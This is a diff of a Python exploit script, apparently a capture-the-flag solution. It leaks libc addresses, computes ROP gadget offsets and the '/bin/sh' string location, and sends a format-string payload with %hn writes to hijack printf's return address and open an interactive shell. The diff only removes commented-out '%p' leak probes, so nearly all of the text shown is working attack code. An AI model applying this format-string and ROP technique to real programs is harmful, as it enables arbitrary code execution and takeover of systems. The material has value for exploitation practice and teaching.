@@ -39,7 +39,6 @@ print(f"printf ret at: {hex(printf_ret)}")
 libc_base = int(leak[13:][:12], 16) - 154760
 print(f"libc base at: {hex(libc_base)}")
 
-
 pop_rdi = libc_base + 0x00000000000fd8c4
 add_rsp = libc_base + 0x00000000000e0493 
 binsh = libc_base + 1748520
@@ -62,11 +61,6 @@ print(hex(add_rsp3))
 
 time.sleep(2)
 
-'''
-payload = "%p %p %p %p %p %p %p %p %p %p %p"
-p.sendline(payload)
-print(p.recvall())
-'''
 
 # prepare pointers for printf's ret and ROP Chain on the stack
 # padding 
@@ -93,11 +87,6 @@ payload = f"%{add_rsp3}c%14$hn"
 payload += f"%{(add_rsp1 - add_rsp3)}c%16$hn"
 payload += f"%{(add_rsp2 - add_rsp1)}c%15$hn"
 
-'''
-payload = "%p %p %p %p %p %p %p %p %p %p %p"
-p.sendline(payload)
-print(p.recvline())
-'''
 p.sendline(payload)   
 
 p.interactive()
